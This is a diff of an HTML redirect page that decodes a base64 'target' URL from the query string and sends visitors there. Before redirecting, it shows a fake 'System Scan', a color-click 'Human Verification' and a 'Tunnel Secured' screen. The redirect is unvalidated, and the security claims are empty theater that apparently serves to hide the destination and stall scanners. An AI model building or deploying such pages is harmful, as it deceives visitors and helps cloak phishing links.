@@ -3,114 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Link Gateway</title>
+    <title>Secure Tunnel | Identity Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
-            --text-color: #ffffff;
+            --glass: rgba(15, 23, 42, 0.6);
+            --border: rgba(255, 255, 255, 0.08);
+            --accent: #38bdf8;
+            --success: #4ade80;
         }
 
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at top right, #1e293b, #0f172a, #000000);
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            color: var(--text-color);
+            color: #f8fafc;
             overflow: hidden;
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--border);
+            border-radius: 28px;
+            padding: 40px;
+            width: 360px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
         }
 
-        .glass-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: 1px solid var(--glass-border);
-            border-radius: 24px;
-            padding: 40px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        h3 {
+            font-weight: 500;
+            letter-spacing: -0.02em;
+            margin: 20px 0 10px;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            font-weight: 300;
+        }
+
+        .step { display: none; }
+        .step.active { 
+            display: block; 
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .loader {
-            width: 48px;
-            height: 48px;
-            border: 3px solid #FFF;
-            border-bottom-color: transparent;
+            width: 50px;
+            height: 50px;
+            border: 2px solid rgba(56, 189, 248, 0.1);
+            border-bottom-color: var(--accent);
             border-radius: 50%;
             display: inline-block;
-            box-sizing: border-box;
-            animation: rotation 1s linear infinite;
-            margin-bottom: 20px;
+            animation: spin 0.8s cubic-bezier(0.5, 0, 0.5, 1) infinite;
         }
 
-        @keyframes rotation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .captcha-box { 
+            display: flex; 
+            gap: 15px; 
+            justify-content: center; 
+            margin-top: 25px; 
         }
 
-        h1 { font-weight: 300; font-size: 1.5rem; margin-bottom: 10px; }
-        p { opacity: 0.8; font-size: 0.9rem; line-height: 1.6; }
+        .color-btn { 
+            width: 45px; 
+            height: 45px; 
+            border-radius: 14px; 
+            cursor: pointer; 
+            border: 2px solid transparent; 
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+        }
 
-        .status-tag {
-            background: rgba(0, 255, 127, 0.2);
-            color: #00ff7f;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 20px;
-            display: inline-block;
+        .color-btn:hover { 
+            transform: translateY(-3px) scale(1.05);
+            border-color: rgba(255, 255, 255, 0.5);
+        }
+
+        #targetColor {
+            padding: 2px 8px;
+            border-radius: 6px;
+            background: rgba(255,255,255,0.05);
         }
     </style>
 </head>
 <body>
 
-    <div class="glass-card">
-        <div class="status-tag">Encryption Active</div>
+<div class="glass-card">
+    <div id="step1" class="step active">
         <div class="loader"></div>
-        <h1>Securing Connection</h1>
-        <p>Please wait while we verify the destination and establish a secure tunnel.</p>
-        <div id="countdown" style="margin-top: 20px; font-weight: bold; font-size: 1.2rem;"></div>
+        <h3>System Scan</h3>
+        <p id="timer1">Initializing security layers in 5s...</p>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetBase64 = urlParams.get('target');
+    <div id="step2" class="step">
+        <h3>Human Verification</h3>
+        <p>Tap the <span id="targetColor">Yellow</span> block to verify</p>
+        <div class="captcha-box" id="colors"></div>
+    </div>
 
-        if (targetBase64) {
-            let timeLeft = 5;
-            const display = document.getElementById('countdown');
-            
-            const timer = setInterval(() => {
-                display.innerText = `Redirecting in ${timeLeft}s...`;
-                if (timeLeft <= 0) {
-                    clearInterval(timer);
-                    try {
-                        window.location.href = atob(targetBase64);
-                    } catch (e) {
-                        document.body.innerHTML = "<h1>Invalid Link</h1>";
-                    }
+    <div id="step3" class="step">
+        <div class="loader" style="border-bottom-color: var(--success);"></div>
+        <h3>Tunnel Secured</h3>
+        <p id="timer2">Finalizing redirection in 5s...</p>
+    </div>
+</div>
+
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const target = params.get('target');
+    const colorData = [
+        {name: 'Red', hex: '#ef4444'}, 
+        {name: 'Blue', hex: '#3b82f6'},
+        {name: 'Yellow', hex: '#eab308'}, 
+        {name: 'Green', hex: '#22c55e'}
+    ];
+
+    function startTimer(id, duration, callback) {
+        let time = duration;
+        const el = document.getElementById(id);
+        const interval = setInterval(() => {
+            time--;
+            el.innerText = `Proceeding in ${time}s...`;
+            if (time <= 0) {
+                clearInterval(interval);
+                callback();
+            }
+        }, 1000);
+    }
+
+    // Start Phase 1
+    startTimer('timer1', 5, () => {
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        generateCaptcha();
+    });
+
+    function generateCaptcha() {
+        const targetObj = colorData[Math.floor(Math.random() * colorData.length)];
+        const textDisplay = document.getElementById('targetColor');
+        textDisplay.innerText = targetObj.name;
+        textDisplay.style.color = targetObj.hex;
+        
+        const container = document.getElementById('colors');
+        container.innerHTML = ''; 
+        
+        [...colorData].sort(() => Math.random() - 0.5).forEach(c => {
+            const btn = document.createElement('div');
+            btn.className = 'color-btn';
+            btn.style.backgroundColor = c.hex;
+            btn.onclick = () => {
+                if (c.name === targetObj.name) {
+                    document.getElementById('step2').classList.remove('active');
+                    document.getElementById('step3').classList.add('active');
+                    startTimer('timer2', 5, () => { 
+                        if(target) window.location.replace(atob(target)); 
+                    });
+                } else {
+                    btn.style.transform = "shake 0.2s";
+                    generateCaptcha();
                 }
-                timeLeft -= 1;
-            }, 1000);
-        } else {
-            document.querySelector('.glass-card').innerHTML = "<h1>Access Denied</h1><p>No destination specified.</p>";
-        }
-    </script>
+            };
+            container.appendChild(btn);
+        });
+    }
+</script>
 </body>
 </html>
